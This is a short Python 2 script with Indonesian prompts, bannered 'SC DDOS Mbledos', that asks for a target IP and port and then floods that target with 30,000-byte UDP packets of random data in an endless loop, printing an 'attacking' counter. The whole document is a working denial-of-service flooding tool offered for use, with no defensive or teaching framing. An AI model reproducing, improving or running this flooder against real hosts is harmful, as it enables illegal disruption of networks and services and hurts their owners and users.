import time 

import datetime 

import socket 

import random 

import sys 

import os


os.system("clear")

os.system("figlet SC DDOS Mbledos")

time = time.ctime(time.time())

def main(): 
   
   print len(sys.argv) 
   
   if len(sys.argv) != 2: 
   
    ip = raw_input ("Masukkan ip/host target:") 
    
    port = input ("Masukkan port: ") 
    
    bytes = input ("Masukkan bytes/paket:")
 
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    
    bytes = random._urandom(30000) 
    
    sent = 0 
    
    while True: 
        
        sock.sendto(bytes, (ip, port)) 
        
        port = port + 0
        
        sent = sent + 1 
        
        print "\033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s bytes %s"%(ip, port, sent)


if __name__ == '__main__': 
        
        main()
    
     
    
